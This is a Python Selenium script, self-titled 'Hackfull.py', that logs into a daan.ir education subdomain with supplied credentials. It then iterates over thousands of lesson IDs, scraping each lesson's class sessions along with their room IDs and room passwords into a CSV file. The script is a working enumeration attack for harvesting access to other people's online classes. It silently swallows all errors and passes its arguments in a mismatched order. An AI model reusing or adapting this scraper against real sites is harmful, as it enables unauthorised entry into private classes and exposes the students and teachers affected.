import sys
import time
import json
import pytest
import pandas as pd
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities



class TestUntitled():
    table = []
    subDomain = 'kiau'
    username = ""
    password = ""
    startRangeId = 8200
    endRangeId = 14505

    def setup_method(self,_username,_password,_subDomain,_startRangeId,_endRangeId):
        self.username = _username
        self.password = _password
        self.subDomain = _subDomain
        self.startRangeId = _startRangeId
        self.endRangeId = _endRangeId
        options = Options()
        options.add_argument('--headless')
        self.driver = webdriver.Firefox(options=options)
        self.vars = {}

    def teardown_method(self):
        self.driver.quit()

    def test_untitled(self):
        self.driver.get(f"http://{str(self.subDomain)}.daan.ir/login-identification-form")
        
        while(1):
            try:
                self.driver.find_element(By.NAME, "identification_number").click()
                self.driver.find_element(By.NAME, "identification_number").send_keys(self.username)
                self.driver.find_element(By.NAME, "password").send_keys(self.password)
                self.driver.find_element(By.CSS_SELECTOR, ".btn-primary").click()
                self.driver.find_element(By.LINK_TEXT, "دوره‌های من").click()
                self.driver.find_element(By.LINK_TEXT, "نمایش").click()
                break
            except:
                pass
            

        try:

            for courceId in range(int(self.startRangeId),int(self.endRangeId)):
                self.rooms = []
                print(courceId)
                self.driver.get(f"http://{str(self.subDomain)}.daan.ir/lesson-detail?id={str(courceId)}")
                body = self.driver.find_element_by_xpath('//*[@class="table table-hover"]/tbody')
                
                if(len(body.text) < 1):
                    continue

                for row in body.find_elements_by_xpath('.//tr'):
                    col = row.find_elements_by_xpath('.//td')
                    print(str(col[0].text)+"|"+str(col[1].text)+"|"+str(col[2].find_elements_by_xpath('.//a[@class="btn btn-warning"]')[0].get_attribute("href")))
                    self.rooms.append({"courceId": courceId, "content":str(col[0].text).replace(",","-"),"startAsDate":str(col[1].text),"detailAddress":str(col[2].find_elements_by_xpath('.//a[@class="btn btn-warning"]')[0].get_attribute("href"))})
                
                for room in self.rooms:
                    print(str(room["detailAddress"])+":")
                    self.driver.get(str(room['detailAddress']))
                    #table_id = self.driver.find_element(By.CSS_SELECTOR, '.table.table-hover')
                    rows = self.driver.find_element_by_xpath('//*[@class="table table-hover"]/tbody')
                    for row in rows.find_elements_by_xpath('.//tr'):
                        col = row.find_elements_by_xpath('.//td')
                        print(str(col[0].text)+"|"+str(col[1].text)+"|"+str(col[2].text)+"|"+str(col[3].text))
                        room["detailContent"] = {"name":str(col[0].text),"classDateTime":str(col[1].text),"roomId":str(col[2].text),"roomPass":str(col[3].text)}
                        print(room)
                        self.table.append(room)

        except:
            pass
            
        print(len(self.table))
        SetPandas(self.table)

def SetPandas(dataTable):
    # Head
    fieldnames = ['courceId','courceContent','detailAddress','courceName','classDateTime','roomId','roomPass']

    # Creat Data Frame
    pdTable = pd.DataFrame({
                    fieldnames[0]: list(j['courceId'] for j in dataTable),
                    fieldnames[1]: list(j['content'] for j in dataTable),
                    fieldnames[2]: list(j['detailAddress'] for j in dataTable),
                    fieldnames[3]: list(j['detailContent']['name'] for j in dataTable),
                    fieldnames[4]: list(j['detailContent']['classDateTime'] for j in dataTable),
                    fieldnames[5]: list(j['detailContent']['roomId'] for j in dataTable),
                    fieldnames[6]: list(j['detailContent']['roomPass'] for j in dataTable),
                    })

    # DataFrame To CSV
    pdTable.to_csv("PandaDBcourses.csv", sep=",", encoding='utf-16')

    return pdTable

# ----------------------Main------------------------
def main():
    # print(sys.argv)
    
    if len(sys.argv) != 6:
        print('Please enter the correct parameter >>> Example: python Hackfull.py subDomain UserName PassWord startRangeId endRangeId')
        exit()
    # SetUser Information
    subDomain = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    startRangeId = sys.argv[4]
    endRangeId = sys.argv[5]
    
    try:
        client = TestUntitled()
        client.setup_method(subDomain,username,password,startRangeId,endRangeId)
        client.test_untitled()
    except:
        print('The username or password is incorrect')

if __name__ == '__main__': main()
